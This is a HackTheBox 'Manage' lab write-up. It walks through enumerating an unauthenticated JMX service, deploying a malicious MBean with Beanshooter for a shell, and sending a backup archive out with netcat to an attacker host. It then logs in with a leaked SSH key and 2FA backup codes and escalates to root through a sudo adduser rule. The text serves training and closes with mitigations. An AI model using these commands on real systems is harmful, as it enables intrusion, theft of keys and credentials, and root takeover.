# HackTheBox - Manage Writeup

## Overview

**Machine:** Manage
**Difficulty:** Easy
**Operating System:** Linux
**Key Topics:** Java RMI, JMX exploitation, credential discovery, backup leakage, sudo misconfiguration


---

# 1. Enumeration

Identifying exposed services.

```bash
nmap -sC -sV <TARGET_IP>
```

### Nmap Results

```
22/tcp   open  ssh
2222/tcp open  java-rmi
8080/tcp open  http (Apache Tomcat)
```

Important findings:

* **Port 22** – SSH
* **Port 8080** – Apache Tomcat web server
* **Port 2222** – Java RMI service

The presence of **Java RMI** is interesting because it often exposes **JMX (Java Management Extensions)** which can sometimes allow **remote management without authentication**.

---

# 2. Understanding Java RMI and JMX

### Java RMI

Java RMI (Remote Method Invocation) allows a client to **execute methods on a remote Java object**.

Example concept:

```
Client → call method → Server
```

If exposed incorrectly, attackers may interact with internal Java services.

---

### Java Management Extensions (JMX)

JMX is used for:

* monitoring Java applications
* remote management
* deploying components called **MBeans**

If authentication is disabled, attackers can **deploy malicious MBeans and execute commands remotely**.

---

# 3. Enumerating the JMX Service

To enumerate the exposed JMX service we use **Beanshooter**, a tool designed to interact with JMX endpoints.

```bash
java -jar beanshooter.jar enum <TARGET_IP> 2222
```

The enumeration revealed:

* The JMX service **does not require authentication**
* Tomcat users are exposed

Example output:

```
Username: manager
Password: fhErvo2r9wuTEYiYgt
```

This confirms that the service is **misconfigured and vulnerable**.

---

# 4. Exploiting JMX via Malicious MBean

Beanshooter provides a **StandardMBean payload** that allows command execution.

Deploy the malicious bean:

```bash
java -jar beanshooter.jar standard <TARGET_IP> 2222 tonka
```

The tool creates and deploys a malicious **MBean object** inside the JMX server.

Then connect to the payload:

```bash
java -jar beanshooter.jar tonka shell <TARGET_IP> 2222
```

This gives us a shell as:

```
tomcat
```

Initial access achieved.

---

# 5. Local Enumeration

After gaining access, the next step is checking the system for sensitive data.

Listing user directories:

```bash
ls /home
```

```
karl
useradmin
```

Inside the `useradmin` directory:

```bash
ls -la /home/useradmin
```

We discover:

```
backups/
.google_authenticator
.ssh/
```

The **backups directory is world-readable**, which is a strong indicator of potential credential leakage.

---

# 6. Backup Archive Discovery

Inside the backups directory:

```
backup.tar.gz
```

Although the tomcat user cannot read some files in the useradmin home directory, the backup archive contains them.

To analyze it locally, we transfer the file using **netcat**.

### On attacker machine

```
nc -lvnp 1234 > backup.tar.gz
```

### On the victim machine

```
nc <ATTACKER_IP> 1234 < backup.tar.gz
```

This recreates the archive locally.

Extract it:

```
tar -xvzf backup.tar.gz
```

The archive contains:

```
.ssh/id_ed25519
.google_authenticator
```

---

# 7. SSH Access

Using the recovered SSH private key:

```
ssh useradmin@<TARGET_IP> -i id_ed25519
```

However, login requires **two-factor authentication (2FA)**.

Looking inside `.google_authenticator` reveals **backup codes**:

```
99852083
20312647
73235136
...
```

These codes bypass the OTP requirement.

After entering one of them, we successfully log in as:

```
useradmin
```

---

# 8. Privilege Escalation

Checking sudo permissions:

```
sudo -l
```

Output:

```
(ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
```

This means the user can create **any alphanumeric user as root**.

---

### Exploiting the Misconfiguration

Ubuntu systems typically include an **admin group** that has full sudo privileges.

If we create a user named `admin`, it will automatically inherit these permissions.

Create the user:

```
sudo /usr/sbin/adduser admin
```

Switch to the new account:

```
su admin
```

Check sudo permissions:

```
sudo -l
```

Full privileges are available.

---

### Become root

```
sudo su
```

Root access achieved.

```
/root/root.txt
```

---

# 9. Attack Chain Summary

```
Nmap Scan
   ↓
Java RMI discovered
   ↓
JMX enumeration with Beanshooter
   ↓
Deploy malicious MBean
   ↓
Remote shell as tomcat
   ↓
Backup archive discovered
   ↓
SSH key + OTP backup codes recovered
   ↓
Login as useradmin
   ↓
Sudo misconfiguration
   ↓
Create admin user
   ↓
Root
```

---

# 10. Lessons Learned

### Java Security

* Exposed JMX services without authentication can lead to **remote code execution**.
* RMI endpoints should never be exposed to untrusted networks.

### Credential Management

* Backup archives may leak **sensitive files such as SSH keys**.

### Authentication

* Google Authenticator backup codes can bypass OTP protections.

### Privilege Escalation

* Allowing users to create arbitrary accounts with sudo can lead to **privilege escalation**.

---

# 11. Mitigation Strategies

To prevent similar attacks:

* Restrict access to **RMI/JMX services**
* Require authentication for **JMX connections**
* Protect backup archives with strict permissions
* Avoid storing sensitive files in accessible backups
* Limit sudo permissions and enforce the **principle of least privilege**

---
